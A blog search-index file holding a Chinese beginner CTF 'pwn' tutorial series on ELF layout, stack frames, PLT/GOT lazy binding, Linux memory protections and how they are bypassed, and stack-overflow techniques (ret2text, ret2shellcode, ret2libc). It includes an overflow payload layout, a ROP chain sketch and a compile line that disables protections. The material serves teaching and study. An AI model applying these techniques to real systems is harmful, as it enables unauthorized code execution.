<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>pwn入门系列10——ELF文件格式</title>
    <link href="/2021/07/11/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%9710%E2%80%94%E2%80%94ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"/>
    <url>/2021/07/11/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%9710%E2%80%94%E2%80%94ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h3 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h3><p>（1）linux环境中，二进制可持续文件的类型是ELF（Executable and Linkable Format）文件。<br>（2）elf文件的格式比较简单，我们需要了解的就是elf文件中各个节、段的概念。<br>（3）elf的基本信息存在于elf的头部信息中，这些信息包括指令的运行架构、程序入口等内容，我们可以通过readelf -h <elfname>来查看头部信息。<br><img src="/2021/07/11/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%9710%E2%80%94%E2%80%94ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/1.png" alt="1.png"><br>（4）elf文件中包含了许多个节（section）,各个节中存放了不同数据，这些节的信息存放在街头表中，readelf -S <file>查看，这些节主要包括：<br><img src="/2021/07/11/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%9710%E2%80%94%E2%80%94ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/2.png" alt="2.png"><br><img src="/2021/07/11/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%9710%E2%80%94%E2%80%94ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/3.png" alt="3.png"><br><img src="/2021/07/11/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%9710%E2%80%94%E2%80%94ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/4.png" alt="4.png"></file></elfname></p><h3 id="加载到内存后的内存布局"><a href="#加载到内存后的内存布局" class="headerlink" title="加载到内存后的内存布局"></a>加载到内存后的内存布局</h3><p>（1）elf在加载进内存时，elf文件的节（section）会被映射进入内存中的段（segment），而这一映射过程遵循的机制是根据各个节的权限来进行映射的。<br>（2）可读可写的节被映射入一个段，只读的节被映射入一个段<br><img src="/2021/07/11/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%9710%E2%80%94%E2%80%94ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/5.png" alt="5.png"><br><img src="/2021/07/11/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%9710%E2%80%94%E2%80%94ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/6.png" alt="6.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn入门系列9——函数调用流程与调用约定</title>
    <link href="/2021/07/08/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%979%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/"/>
    <url>/2021/07/08/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%979%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/</url>
    
    <content type="html"><![CDATA[<h3 id="函数调用流程"><a href="#函数调用流程" class="headerlink" title="函数调用流程"></a>函数调用流程</h3><p><img src="/2021/07/08/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%979%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/2.png" alt="1.png"><br>（1）当运行到call func_b时main函数的栈帧<br>（2）RBP指向栈顶,rsp指向栈顶<br>（3）这段栈帧存放了一些main的局部变量<br>（4）main函数要调用func_b,main只需要call func_b<br>（5）也就是push rip；mov rip func_b;<br><img src="/2021/07/08/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%979%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/2.png" alt="2.png"><br>（6）那么此时跳转到func_b继续执行，func_b直接执行主逻辑吗？<br>（7）显然不是的，被调用函数还要维护栈帧。<br>（8）具体来说，需要以下几步<br>①push rbp：将调用函数的栈底指针保存<br>②mov rbp rsp：将栈底指针指向现在的栈顶<br>③sub rsp xxx；开辟被调用函数的栈帧，此时上一步的rbp就指向栈帧的底部。<br>（9）func_b执行完维护栈帧操作后的栈布局<br>（10）所谓栈帧的维护就是维护rbp和rsp两个指针<br>（11）RSP永远指向栈顶<br>（12）RBP用来定位局部变量<br><img src="/2021/07/08/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%979%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/3.png" alt="3.png"><br>（13）现在，func_b要调用func_a，其调用流程与main函数调用func_b基本一致<br>（14）不同之处在于返回地址、rbp和rsp指向的地址，以及开辟的栈空间不同<br>（15）func_b调用完func_a后的栈布局<br><img src="/2021/07/08/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%979%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/4.png" alt="4.png"><br>（16）至此，示例的函数调用已经完毕<br>（17）现在，func_a执行完毕，要返回了<br>（18）该如何维护栈帧呢？<br>（19）Leave指令：<br>①作用是维护栈帧，通常出现在函数的结尾，与ret连用<br>②其实际作用为：mov rsp rbp;pop rbp;<br>③即：将栈顶指针指向栈帧底部，然后在栈中弹出新的栈底指针。<br>（20）在一个函数执行结束返回时，会执行leave；ret<br>（21）实际效果就是：mov rsp rbp；pop rbp；pop eip<br>（22）观察程序执行至func_a时的栈帧。<br><img src="/2021/07/08/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%979%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/5.png" alt="5.png"><br>（23）func_a执行完毕返回后，栈布局如图：<br><img src="/2021/07/08/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%979%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/6.png" alt="6.png"><br>（24）可以与之前func_b未调用func_a前的栈帧对比<br>（25）一模一样，说明已经恢复了栈帧<br>（26）唯一不同处就在于此程序的rip已经指向了c=1<br>（27）func_b执行完毕返回后，栈布局如图：<br><img src="/2021/07/08/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%979%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/7.png" alt="7.png"><br>（28）在这之后，main函数继续执行，直到结束。</p><h3 id="函数调用流程总结"><a href="#函数调用流程总结" class="headerlink" title="函数调用流程总结"></a>函数调用流程总结</h3><p>①调用函数：只需要将rip压栈，即push rip，然后将rip赋值为被调用函数的起始地址，这已操作被隐性的内置在call指令中。<br>②被调用函数：push rbp;mov rbp rsp;sub rsp 0xxx。即保存调用函数的rbp指针，将自己的rbp指针指向栈顶，然后开辟栈空间给自己用，此时就变成了被调用函数的栈底。<br>③函数返回：leave；ret；翻译过来就是：mov rsp rbp；pop rbp；pop rip；<br>即恢复栈帧，返回调用函数的返回地址。</p><h3 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h3><p>（1）返回值：一般来说，一个函数的返回值会存储到RAX寄存器<br>（2）X86-64函数的调用约定为：<br>①从左至右参数一次传递给rdi,rsi，rdx,rcx,r8,r9<br>②如果一个函数的参数多于6个，则其余的参数从右至左压入栈中传递。<br>（3）syscall指令：<br>①用于调用系统函数，调用时需要知名操作系统调用号<br>②系统调用号在rax寄存器中，然后布置好参数，执行syscall即可。<br><img src="/2021/07/08/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%979%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/8.png" alt="8.png"><br><img src="/2021/07/08/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%979%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/9.png" alt="9.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn入门系列8——基本栈溢出</title>
    <link href="/2021/07/04/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%978%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <url>/2021/07/04/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%978%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h3 id="基础栈溢出"><a href="#基础栈溢出" class="headerlink" title="基础栈溢出"></a>基础栈溢出</h3><p>①一般来说，在CTF中的PWN，多数情况下我们需要让程序执行这一段代码：<br>②system(“/bin/sh”)<br>③也就是说在远程机器上开一个命令行终端。<br>④这样我们就可以通过命令行来控制目标机器。</p><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>①理想情况下，程序中有一段代码能直接满足我们的需求<br><img src="/2021/07/04/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%978%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E6%A0%88%E6%BA%A2%E5%87%BA/1.png" alt="1.png"><br>②我们只需要将执行流劫持到这一段代码即可。</p><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>①如果程序中没有这样的代码，怎么办？<br>②我们可以自己写shellcode<br>③shellcode就是一段可以独立运行开启shell的一段汇编代码。<br><img src="/2021/07/04/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%978%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E6%A0%88%E6%BA%A2%E5%87%BA/2.png" alt="2.png"><br>④ret2shellcode的思路就是：<br>⑤如果程序中存在让用户向一段长度足够的缓冲区输入数据。<br>⑥我们向其输入shellcode。<br>⑦将程序劫持到shellcode上即可。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>①vul函数存在明显的栈溢出。<br>②可以劫持控制流到gen_shell函数。<br>③可以劫持控制流到global_buf（即bss段，全局变量在bss段，向bss段写入shellcode）<br>④gcc example.c -o example -z execstack -fno-stack-protector -no-pie -z -norelro<br>⑤编译完成后，sudo chmod +x example（给执行权限）<br>⑥运行：./example</p><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>①有时候我们需要调用一些系统函数，比如说system或者execve等。<br>②程序中可能不会提供一些现成的函数。<br>③如果我们拿到了libc中函数的地址，我们可以直接调用libc的函数。<br>④只需要传递好参数，然后call即可。<br>⑤那么如何传递参数呢？<br>⑥如调用system(/bin/sh)<br>⑦只需要将rdi设置为/bin/sh字符串地址，然后call system即可。<br>⑧如何设置？</p><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>①如果直接mov，然后call，那么就和ret2shellcode无异。<br>②现在问题是，我们只有一个libc地址和/bin/sh字符串地址，以及一个栈溢出漏洞，怎么传递参数？<br>③思考如下形式的栈溢出<br>④pop rdi ret+/bin/sh地址+system</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn入门系列7——栈溢出原理</title>
    <link href="/2021/07/04/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%977%E2%80%94%E2%80%94%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/"/>
    <url>/2021/07/04/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%977%E2%80%94%E2%80%94%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>①函数中的存储在栈中的局部变量数组边界检查不严格发生越界写，造成用户输入覆盖到缓冲区外的数据内容。<br>②由于栈中同时存在着与函数调用参数相关信息，栈溢出可以导致控制流劫持。</p><h3 id="栈溢出过程"><a href="#栈溢出过程" class="headerlink" title="栈溢出过程"></a>栈溢出过程</h3><p>①main函数调用b，b函数调用a。<br>②缓冲区溢出发生在a函数中。<br>③buf的长度是80，但是却读入了200长度。<br><img src="/2021/07/04/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%977%E2%80%94%E2%80%94%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/1.png" alt="1.png"><br>④分析程序运行至a时的栈帧。<br>⑤栈中存放buf和返回地址等信息。<br>⑥buf的长度为80，紧邻b函数的rbp指针和返回地址。<br><img src="/2021/07/04/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%977%E2%80%94%E2%80%94%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/2.png" alt="2.png"><br>⑦如果我们此时读入80字节长度的数据，没问题。<br>⑧如果我们读入长度超过80字节的数据呢？<br><img src="/2021/07/04/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%977%E2%80%94%E2%80%94%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/3.png" alt="3.png"></p><h3 id="栈溢出过程-1"><a href="#栈溢出过程-1" class="headerlink" title="栈溢出过程"></a>栈溢出过程</h3><p>①这里我们读入‘X’<em>80 + ‘A’</em>8 + ‘B’<em>8<br>②可以看到，原本存储b函数的rbp地址内容已经被覆盖成了”AAAAAAAA”<br>③返回地址已经被覆盖为了”BBBBBBBB”<br>④这时候如果程序返回，程序会返回一个异常错误。<br>⑤因为”BBBBBBBB”这个字符串，翻译到16进制：0x4242424242424242，这个地址在内存中不是一个合法的代码地址。<br>⑥我们变换一下思路，这次我们输入的数据是‘X’</em>80 + ‘A’*8 + target addr<br>⑦target addrs是我们想要程序跳转到的地方。<br>⑧这时候，程序的执行流就被我们控制了。</p><h3 id="rbp"><a href="#rbp" class="headerlink" title="rbp"></a>rbp</h3><p>①那么RBP我们就不管了吗？<br>②是的，一般情况下，RBP的值不需要我们构造。<br>③RBP是程序用来定位栈中的局部变量地址的。<br>④除非涉及到RBP寄存器传递参数，一般的ROP不需要管RBP。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>①栈溢出的原理就是栈中存储的局部变量数组发生了溢出，覆盖了栈中的其他数据。<br>②将返回地址覆盖为我们期望的目标地址，几个劫持控制流。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn入门系列6——linux保护机制</title>
    <link href="/2021/07/02/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%976%E2%80%94%E2%80%94linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <url>/2021/07/02/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%976%E2%80%94%E2%80%94linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h3 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h3><p>Canary<br>NX<br>ASLR<br>PIE<br>RELRO</p><h3 id="CANARY"><a href="#CANARY" class="headerlink" title="CANARY"></a>CANARY</h3><p>①canary中文翻译是金丝雀，来源是之前科技不发达时，旷工会在下井作业时带一个金丝雀，用来片段地下环境有没有煤气之类的毒气泄露，金丝雀没事，大家继续干活；如果金丝雀死了，大家赶紧跑。<br>②在linux中,canary的作用就如同他引用的一样，用来判断程序的执行环境，主要是针对检测栈溢出。<br>③canary是一个开头字节为\x00的一段长度为8个字节的随机数，这个随机数本身存放于fs段偏移为0x28的区域。<br>④在每次函数调用中，程序都会将这段随机数存放于栈底，每次运行结束返回时，都会将这个随机数与它的本体进行比对。<br>⑤如果这个值被改变，则意味着发生了栈溢出，程序直接退出，如果没有改变，程序会继续执行。<br>⑥由于canary开头字节为\x00，所以通常情况下不能被打印出来。<br>⑦通常情况下，程序如果开起来canary保护，大概率说明这道题目不是栈溢出题目了。当然也要具体情况具体分析。<br>⑧绕过方法主要就是修改canary或者泄露canary。</p><h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><p>①NX的意思就是Not Executable，开启这个保护后，程序中的堆、栈、bss段等可写的段就不可以执行。<br>②这就意味着如果开启了NX保护，通常情况下我们就不能执行我们自己编写的shellcode。<br>③绕过方式通常是用mprotect函数来改写段的权限，nx保护对于rop或者劫持got表利用方式不影响。</p><h3 id="PIE和ASLR"><a href="#PIE和ASLR" class="headerlink" title="PIE和ASLR"></a>PIE和ASLR</h3><p>①在我们编写ROP或者shellcode时，有一个问题是绕不开的，那就是找到函数地址。<br>②PIE指的就是程序内存加载基地址随机化，意味着我们不能一下子确定程序的基地址。<br>③ASLR与其大同小异，ASLR是程序运行动态链接库、栈等地址随机化。<br>④通常来说，CTF中的PWN题与这两个保护打交道的次数最多。<br>⑤绕过方式就是泄露函数地址，然后通过函数的偏移来确定基地址。</p><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>①这个保护主要针对的是延迟绑定机制，意思就是说got表这种和函数动态链接相关的内存地址，对于用户是只读的。<br>②开启了这个保护，意味着我们不能劫持got表中的函数指针。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn入门系列5——linux延迟绑定机制</title>
    <link href="/2021/07/01/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%975%E2%80%94%E2%80%94linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6/"/>
    <url>/2021/07/01/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%975%E2%80%94%E2%80%94linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h3 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h3><p>①我们程序开发过程中都会用到系统函数，比如read，write，open等。<br>②这些系统函数不需要我们实现，因为系统已经帮你完成这些工作，只需要调用即可，存放这些函数的库文件就是动态链接库。<br>③通常情况下，我们对于pwn题接触到的动态链接库就是libc.so文件。</p><h3 id="静态编译与动态编译"><a href="#静态编译与动态编译" class="headerlink" title="静态编译与动态编译"></a>静态编译与动态编译</h3><p>①静态编译的思路就是将所有可能运行到的库函数一同编译到可执行文件中。<br>②动态编译的思路就是遇到需要调用的库函数时再去动态链接库中寻找。</p><h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>在程序运行时，got表初始并不保存库函数的地址，只有在第一次调用过后，程序才将这一地址保存在got表中。</p><h3 id="PLT和GOT"><a href="#PLT和GOT" class="headerlink" title="PLT和GOT"></a>PLT和GOT</h3><p>①GOT（Global Offset Tabal，全局偏移表）<br>GOT是数据段用于地址无关代码的Linux ELF文件中确定全局变量和外部函数地址的表。ELF中有.got和.plt.got两个GOT表，.got表用于全局变量的引用地址，.got.plt用于保存函数引用的地址。<br>②PLT（Procedure Linkage Table，程序链接表）<br>PLT是linux ELF文件中用于延迟绑定的表。</p><h3 id="PLT与GOT"><a href="#PLT与GOT" class="headerlink" title="PLT与GOT"></a>PLT与GOT</h3><p>①不论是第几次调用外部函数，程序真正调用的其实是Plt表。<br>②plt表其实是一段段汇编指令构成。</p><h3 id="PLT与GOT表"><a href="#PLT与GOT表" class="headerlink" title="PLT与GOT表"></a>PLT与GOT表</h3><p>①在第一次调用外部函数时，plt表首先会跳到对应的got表项中。<br>②由于并没有被调用过，此时got表存储的并不是目标函数的地址，此时的got表中存储的地址是plt表中的一段指令，其作用就是准备一些参数，进行动态解析。<br>③跳转回plt表后，plt表又会跳转回PLT表头，表头内容就是调用动态解析函数，将目标函数地址存放到got表中。<br><img src="/2021/07/01/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%975%E2%80%94%E2%80%94linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6/1.png" alt="1.png"></p><h3 id="PLT和GOT表"><a href="#PLT和GOT表" class="headerlink" title="PLT和GOT表"></a>PLT和GOT表</h3><p>在之后第二次以上的调用后，程序已经完成了延迟绑定，got表中已经存储了目标函数的地址，直接跳转即可。<br><img src="/2021/07/01/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%975%E2%80%94%E2%80%94linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6/2.png" alt="2.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn入门系列4——ELF文件格式</title>
    <link href="/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%974%E2%80%94%E2%80%94ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"/>
    <url>/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%974%E2%80%94%E2%80%94ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h3 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h3><p>①linux环境中，二进制可执行文件的类型是（Executable and Linkable Format）文件。<br>②elf文件的格式比较简单，我们需要了解的就是elf文件中的各个节、段等概念。<br>③elf的基本信息存在于elf的头部信息中，这些信息包括指令的运行架构、程序入口等等内容，我们可以通过readelf -h <elf_name>来查看头部信息。<br><img src="/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%974%E2%80%94%E2%80%94ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/1.png" alt="1.png"></elf_name></p><h3 id="ELF文件-1"><a href="#ELF文件-1" class="headerlink" title="ELF文件"></a>ELF文件</h3><p>elf文件中包含许多个节(section)，各个节中存放不同的数据，这些节的信息存放在节头表中，readelf -S <file>查看，这些节主要包括：<br><img src="/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%974%E2%80%94%E2%80%94ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/2.png" alt="2.png"><br><img src="/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%974%E2%80%94%E2%80%94ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/3.png" alt="3.png"><br><img src="/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%974%E2%80%94%E2%80%94ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/4.png" alt="4.png"></file></p><h3 id="ELF文件-2"><a href="#ELF文件-2" class="headerlink" title="ELF文件"></a>ELF文件</h3><p>①elf文件在加载进入内存时：<br>②elf文件的节(section)会被映射进内存中的段(segment)，而这一映射过程遵循的机制是根据各个节的权限来进行映射的。<br>③换句话说，可读可写的节被映射入一个段，只读的节被映射入一个段。<br><img src="/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%974%E2%80%94%E2%80%94ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/5.png" alt="5.png"><br><img src="/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%974%E2%80%94%E2%80%94ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/6.png" alt="6.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn入门系列3——函数调用流程与调用约定</title>
    <link href="/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%973%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/"/>
    <url>/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%973%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/</url>
    
    <content type="html"><![CDATA[<h3 id="函数调用流程"><a href="#函数调用流程" class="headerlink" title="函数调用流程"></a>函数调用流程</h3><p>①从一个实际例子出发<br>②main调用func_b，func_b调用func_a<br>③从main函数开始，逐步分析栈帧变化<br><img src="/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%973%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/1.png" alt="1.png"></p><h3 id="函数调用流程-1"><a href="#函数调用流程-1" class="headerlink" title="函数调用流程"></a>函数调用流程</h3><p>①当运行到call func_b时main函数的栈帧<br>②RBP指向栈底，RSP指向栈顶<br>③这段栈帧存放了一些main函数的局部变量<br>④main函数要调用func_b，main只需要call func_b<br>⑤也就是push rip ；mov rip func_b；<br><img src="/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%973%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/2.png" alt="2.png"></p><h3 id="函数调用流程-2"><a href="#函数调用流程-2" class="headerlink" title="函数调用流程"></a>函数调用流程</h3><p>①那么此时跳转到func_b继续执行，func_b直接执行主逻辑吗？<br>②显然不是的，被调用函数func_b还需要维护栈帧。<br>③具体来说，需要以下几步：<br>    push rbp；将调用函数的栈底指针保存。<br>    mov rbp,rsp ；将栈底指针指向现在的栈顶<br>    sub rsp,xxx；开辟被调用函数栈帧，此时上一步的rbp就是指向栈帧的底。</p><h3 id="函数调用流程-3"><a href="#函数调用流程-3" class="headerlink" title="函数调用流程"></a>函数调用流程</h3><p>①func_b执行完维护栈帧操作后的栈布局<br>②所谓栈帧的维护就是维护rbp和rsp两个指针<br>③RSP永远指向栈顶<br>④RBP用来定位局部变量<br><img src="/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%973%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/3.png" alt="3.png"></p><h3 id="函数调用流程-4"><a href="#函数调用流程-4" class="headerlink" title="函数调用流程"></a>函数调用流程</h3><p>①现在,func_b要调用func_a，其调用流程与main函数调用func_b基本一致。<br>②不同处在于返回地址、rbp和rsp指向的地址，以及开辟的栈空间的不同。</p><h3 id="函数调用流程-5"><a href="#函数调用流程-5" class="headerlink" title="函数调用流程"></a>函数调用流程</h3><p>①func_b调用完func_a后的栈布局<br>②至此，示例的函数调用已经完毕<br>③现在，func_a执行完毕，要返回了<br><img src="/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%973%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/4.png" alt="4.png"></p><h3 id="函数调用流程-6"><a href="#函数调用流程-6" class="headerlink" title="函数调用流程"></a>函数调用流程</h3><p>leave指令<br>①作用是维护栈帧，通常出现在函数的结尾，与ret连用<br>②其实际作用为mov rsp,rbp;pop rbp;<br>③将栈顶指针指向栈帧底部，然后在栈中弹出新的栈底指针</p><h3 id="函数调用流程-7"><a href="#函数调用流程-7" class="headerlink" title="函数调用流程"></a>函数调用流程</h3><p>①在一个函数执行结束返回时，会执行leave ; ret ;<br>②实际效果就是：mov rsp rbp; pop rbp ; pop eip ;<br>③此时我们观察程序执行到func_a时的栈帧。<br><img 